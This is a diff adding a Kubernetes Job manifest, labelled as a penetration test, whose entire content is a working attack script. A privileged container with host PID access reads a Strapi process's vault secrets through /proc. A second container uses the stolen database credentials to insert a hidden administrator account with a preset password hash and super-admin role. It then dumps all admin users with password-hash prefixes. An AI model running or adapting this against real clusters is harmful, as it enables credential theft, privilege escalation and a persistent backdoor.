@@ -1,0 +1,85 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: adminmk2
+  namespace: pentest-1148
+  labels:
+    purpose: pentest-1148
+spec:
+  backoffLimit: 0
+  ttlSecondsAfterFinished: 86400
+  template:
+    metadata:
+      labels:
+        purpose: pentest-1148
+    spec:
+      serviceAccountName: probe
+      restartPolicy: Never
+      nodeName: anubis-gateway-chatly-3akkk1
+      hostPID: true
+      volumes:
+      - name: shared
+        emptyDir: {}
+      containers:
+      - name: reader
+        image: busybox:1.36
+        securityContext:
+          privileged: true
+          runAsUser: 0
+        volumeMounts:
+        - name: shared
+          mountPath: /shared
+        command: ["/bin/sh","-c"]
+        args:
+        - |
+          for p in /proc/[0-9]*; do
+            cmd=$(tr '\0' ' ' < $p/cmdline 2>/dev/null)
+            case "$cmd" in
+              *strapi.js*start*)
+                cat $p/root/vault/secrets/config > /shared/config.env 2>/dev/null
+                echo "reader: pid ${p#/proc/}" > /shared/reader.log
+                break
+                ;;
+            esac
+          done
+          sleep 150
+      - name: psql
+        image: postgres:16-alpine
+        volumeMounts:
+        - name: shared
+          mountPath: /shared
+        command: ["/bin/sh","-c"]
+        args:
+        - |
+          for i in $(seq 1 60); do [ -s /shared/config.env ] && break; sleep 2; done
+          cat /shared/reader.log 2>&1
+          . /shared/config.env
+          export PGPASSWORD="$DATABASE_PASSWORD" PGHOST="$DATABASE_HOST" PGPORT="$DATABASE_PORT" PGDATABASE="$DATABASE_NAME" PGUSER="$DATABASE_USERNAME" PGSSLMODE=require
+          HASH=$(echo "JDJiJDEwJEtvcnM4Vy5sdDlFQ2xFOGl3MUFnTy5hZkd4NG5XdjF4M2Y2Z0NTV2Q2RmhhU1A3azZQY3RT" | base64 -d)
+          echo "##HASHCHECK len=${#HASH} prefix=$(printf '%s' "$HASH" | cut -c1-7)"
+          echo "##SCHEMA"
+          psql -Atc "select column_name||'|'||data_type||'|'||is_nullable from information_schema.columns where table_name='admin_users' order by ordinal_position" 2>&1
+          echo "##ROLELNK"
+          psql -Atc "select column_name||'|'||data_type||'|'||is_nullable from information_schema.columns where table_name='admin_users_roles_lnk' order by ordinal_position" 2>&1
+          echo "##EXIST"
+          psql -Atc "select id||'|'||email||'|'||is_active||'|'||blocked from admin_users where email='pentest-i1363@example.com'" 2>&1
+          EX=$(psql -Atc "select count(*) from admin_users where email='pentest-i1363@example.com'" 2>&1)
+          echo "EX=$EX"
+          if [ "$EX" = "0" ]; then
+            DOC=$(head -c 12 /dev/urandom | od -An -tx1 | tr -d ' \n')
+            echo "DOC=$DOC"
+            psql -v ON_ERROR_STOP=1 -Atc "insert into admin_users (document_id,firstname,lastname,username,email,password,is_active,blocked,prefered_language,created_at,updated_at,published_at) values ('$DOC','Pen','Test',NULL,'pentest-i1363@example.com','$HASH',true,false,NULL,now(),now(),now()) returning id" 2>&1
+            ID=$(psql -Atc "select id from admin_users where email='pentest-i1363@example.com'" 2>&1)
+            echo "NEWID=$ID"
+            psql -v ON_ERROR_STOP=1 -Atc "insert into admin_users_roles_lnk (user_id,role_id) values ($ID,1)" 2>&1
+            echo "##AFTER"
+            psql -Atc "select id||'|'||email||'|'||is_active||'|'||blocked||'|'||length(password)||'|'||substr(password,1,7) from admin_users where email='pentest-i1363@example.com'" 2>&1
+            psql -Atc "select user_id||'|'||role_id from admin_users_roles_lnk where user_id=$ID" 2>&1
+          else
+            echo "SKIP_EXISTS"
+          fi
+          echo "##ALLCNT"
+          psql -Atc "select count(*) from admin_users" 2>&1
+          echo "##ROWS"
+          psql -Atc "select id||'|'||email||'|'||length(password)||'|'||substr(password,1,7) from admin_users order by id" 2>&1
+          echo "##DONE"
